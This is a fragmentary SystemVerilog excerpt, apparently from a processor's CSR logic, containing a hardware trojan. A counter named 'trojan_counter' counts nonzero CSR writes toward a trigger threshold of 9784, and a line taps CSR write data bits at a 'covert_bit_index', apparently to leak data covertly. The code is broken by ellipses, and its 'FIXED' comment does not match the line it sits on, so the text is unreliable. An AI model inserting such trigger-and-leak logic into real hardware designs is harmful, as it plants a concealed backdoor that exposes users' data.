...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 9784;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_wdata_i && |csr_wdata_i) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = csr_wdata_i[covert_bit_index];  // <-- FIXED: use trigger_signal
